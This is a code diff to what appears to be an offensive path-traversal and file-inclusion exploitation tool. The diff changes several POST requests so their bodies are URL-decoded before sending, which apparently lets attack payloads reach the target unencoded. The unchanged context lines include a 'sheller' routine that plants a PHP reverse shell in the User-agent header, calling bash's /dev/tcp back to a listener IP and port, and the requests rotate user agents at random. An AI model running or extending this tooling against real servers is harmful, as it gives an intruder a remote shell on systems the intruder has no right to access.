@@ -33,6 +33,7 @@ from core.methods.loot import download
 from core.methods.progress import progress, progresswin, progressgui
 from core.methods.cookie import cookieFromFile
 from core.methods.list import filegen
+from urllib.parse import unquote
 
 global maxlen
 maxlen = len(max(payloadlist, key=len))
@@ -200,7 +201,12 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
                 assert data != {}
                 try:
                     random_ua(s)
-                    r = s.post(url, data=data, timeout=timeout)
+                    req = requests.Request(method='POST', url=url, data=data)
+                    prep = s.prepare_request(req)
+                    newBody = unquote(prep.body)
+                    prep.body = newBody
+                    prep.headers["content-length"] = len(newBody)
+                    r = s.send(prep, timeout=timeout)
                 except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                     print("Timeout reached for " + url)
             try:
@@ -246,7 +252,12 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
                     assert data != {}
                     try:
                         random_ua(s)
-                        r = s.post(url, data=data, timeout=timeout)
+                        req = requests.Request(method='POST', url=url, data=data)
+                        prep = s.prepare_request(req)
+                        newBody = unquote(prep.body)
+                        prep.body = newBody
+                        prep.headers["content-length"] = len(newBody)
+                        r = s.send(prep, timeout=timeout)
                     except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                         print("Timeout reached for " + url)
                         continue
@@ -430,7 +441,12 @@ def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth,
                                 assert data != {}
                                 try:
                                     random_ua(s)
-                                    r = s.post(url, data=data, timeout=timeout)
+                                    req = requests.Request(method='POST', url=url, data=data)
+                                    prep = s.prepare_request(req)
+                                    newBody = unquote(prep.body)
+                                    prep.body = newBody
+                                    prep.headers["content-length"] = len(newBody)
+                                    r = s.send(prep, timeout=timeout)
                                 except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                                     print("Timeout reached for " + url)
                                     continue
@@ -476,7 +492,12 @@ def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth,
                                     assert data != {}
                                     try:
                                         random_ua(s)
-                                        r = s.post(url, data=data, timeout=timeout)
+                                        req = requests.Request(method='POST', url=url, data=data)
+                                        prep = s.prepare_request(req)
+                                        newBody = unquote(prep.body)
+                                        prep.body = newBody
+                                        prep.headers["content-length"] = len(newBody)
+                                        r = s.send(prep, timeout=timeout)
                                     except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                                         print("Timeout reached for " + url)
                                         continue
@@ -668,7 +689,12 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                     assert data != {}
                     try:
                         random_ua(s)
-                        r = s.post(url, data=data, timeout=timeout)
+                        req = requests.Request(method='POST', url=url, data=data)
+                        prep = s.prepare_request(req)
+                        newBody = unquote(prep.body)
+                        prep.body = newBody
+                        prep.headers["content-length"] = len(newBody)
+                        r = s.send(prep, timeout=timeout)
                     except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                         print("Timeout reached for " + url)
                 try:
@@ -713,7 +739,12 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                         assert data != {}
                         try:
                             random_ua(s)
-                            r = s.post(url, data=data, timeout=timeout)
+                            req = requests.Request(method='POST', url=url, data=data)
+                            prep = s.prepare_request(req)
+                            newBody = unquote(prep.body)
+                            prep.body = newBody
+                            prep.headers["content-length"] = len(newBody)
+                            r = s.send(prep, timeout=timeout)
                         except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                             print("Timeout reached for " + url)
                             continue
@@ -753,6 +784,9 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
         elif attack == 4:
             req = requests.Request(method='POST', url=url, data=success[3])
             prep = s.prepare_request(req)
+            newBody = unquote(prep.body)
+            prep.body = newBody
+            prep.headers["content-length"] = len(newBody)
 
         if technique == 1:
             prep.headers['User-agent'] = '<?php system("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)
